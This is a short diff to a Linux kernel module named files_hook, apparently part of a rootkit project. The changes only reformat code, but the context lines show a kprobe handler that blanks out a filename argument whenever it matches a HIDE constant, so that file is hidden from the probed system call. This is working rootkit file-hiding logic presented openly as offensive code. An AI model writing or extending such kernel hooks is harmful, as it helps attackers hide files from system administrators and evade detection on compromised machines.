@@ -25,12 +25,11 @@ static struct kprobe kp = {
 /* kprobe pre_handler: called just before the probed instruction is executed */
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-	char *filename = (char *)regs->si;
 
-	dbg_print(
-		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
-		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
-		regs->flags);
+	char * filename = (char *)regs->si;
+
+	dbg_print("<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
+			p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
 	if (strcmp(filename, HIDE) == 0)
 		strcpy((char *)regs->si, "\x00");
 
@@ -57,7 +56,8 @@ static void __exit files_hook_exit(void)
 	pr_info("files_hook exit successfully\n");
 }
 
-module_init(files_hook_init) module_exit(files_hook_exit)
+module_init(files_hook_init)
+module_exit(files_hook_exit)
 	MODULE_AUTHOR("MikeHorn-git");
-MODULE_DESCRIPTION("kallsyms_lookup_name");
-MODULE_LICENSE("GPL");
+	MODULE_DESCRIPTION("kallsyms_lookup_name");
+	MODULE_LICENSE("GPL");
